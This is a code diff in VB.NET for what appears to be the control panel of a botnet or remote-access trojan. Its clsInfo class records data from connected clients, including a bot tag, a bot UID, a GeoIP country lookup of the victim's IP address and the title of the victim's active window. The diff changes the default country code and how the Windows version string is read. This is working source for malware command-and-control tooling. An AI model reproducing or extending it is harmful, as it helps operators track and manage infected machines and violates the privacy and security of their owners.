@@ -31,9 +31,9 @@ Public Class clsInfo
 
         Dim getCountryObj As Getcountry = New Getcountry(Application.StartupPath + "\GeoIP.dat")
         ClientInfo.countryCode = getCountryObj.LookupCountryCode(Conn.GetIPAddr())
-        'If ClientInfo.countryCode = "--" Then
-        'ClientInfo.countryCode = "VN"
-        'End If
+        If ClientInfo.countryCode = "--" Then
+            ClientInfo.countryCode = "US"
+        End If
 
     End Sub
 
@@ -52,27 +52,7 @@ Public Class clsInfo
             Case INFO_CURRENT_WINDOW ' Widow tittle
                 ClientInfo.WindowTitle = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 1, packet.Length - 1))
             Case INFO_WINDOW_VERSION ' Window version. Would be a lot of if/else
-                Dim dwMajorVersion As Integer = packet(1)
-                Dim dwMinorVersion As Integer = packet(2)
-                If dwMajorVersion = 10 And dwMinorVersion = 0 Then
-                    ClientInfo.windowVersion = "Windows 10/Windows Server 2016"
-                ElseIf dwMajorVersion = 6 And dwMinorVersion = 3 Then
-                    ClientInfo.windowVersion = "Windows 8.1/Windows Server 2012 R2"
-                ElseIf dwMajorVersion = 6 And dwMinorVersion = 2 Then
-                    ClientInfo.windowVersion = "Windows 8/Windows Server 2012"
-                ElseIf dwMajorVersion = 6 And dwMinorVersion = 1 Then
-                    ClientInfo.windowVersion = "Windows 7/Windows Server 2008 R2"
-                ElseIf dwMajorVersion = 6 And dwMinorVersion = 0 Then
-                    ClientInfo.windowVersion = "Windows Vista/Windows Server 2008"
-                ElseIf dwMajorVersion = 5 And dwMinorVersion = 2 Then
-                    ClientInfo.windowVersion = "Windows XP Professional x64 Edition/Windows Server 2003"
-                ElseIf dwMajorVersion = 5 And dwMinorVersion = 1 Then
-                    ClientInfo.windowVersion = "Windows XP"
-                ElseIf dwMajorVersion = 5 And dwMinorVersion = 0 Then
-                    ClientInfo.windowVersion = "Windows 2000"
-                Else
-                    ClientInfo.windowVersion = "Unknown windows version"
-                End If
+                ClientInfo.windowVersion = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 1, packet.Length - 1))
             Case INFO_BOTTAG ' Bot Tag
                 ClientInfo.botTag = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 1, packet.Length - 1))
             Case INFO_BOTUID
